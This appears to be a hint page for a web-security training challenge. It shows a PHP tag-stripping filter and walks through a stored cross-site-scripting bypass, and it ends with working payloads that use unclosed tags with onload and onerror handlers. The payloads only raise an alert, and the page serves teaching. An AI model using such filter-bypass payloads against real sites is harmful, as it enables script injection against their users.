Alert Me 1
==========

## What to do here?

Cost: 0%

Your task is to leave a malicious comment and display a javascript `alert` for everyone who loads the page.

## I can't even imagine the source code

Cost: 20%

**Good news:** It's not so complicated:

```
// Stripping whitespaces from the beginning / end of the string
$message = trim( $_POST[ 'message' ] );

// Replacing HTML tags with empty string	
while (preg_match('/<[^>]*>/', $message)){
	$message = preg_replace('/<[^>]*>/', '', $message);
}

// Example: ASDFGH<SOME TAG>QWERTY -> ASDFGHQWERTY
```

**Bad news:** `name` parameter is filtered too.

## The wrong way

Cost: 10%

I bet your first idea is to construct a string like this `<scr<script>ipt>`, but it will not work here.

 * **Reason 1:** There is a while loop in the code, so we are filtering tags while it contains any.
 * **Reason 2:** It's not a simple replace - it's a replace with regexp. If your string looks like this `<<<<>>>>`, the server removes the `<<<<>` part, so the output will be `>>>`.


## How to XSS without HTML tags?

Cost: 60%

Remember the regexp? It filters only **complete** tags. Browsers are very helpful.


## Complete solution

You can't use **complete** HTML tags in your message, so don't end it!  
There are many `>` symbols in the source code anyway, let the browser find you one!

Some possible solutions:

```
<svg/onload=alert(1) <!--

<svg/onload="alert(1)"

<img src=x onerror="alert('xss')"
```
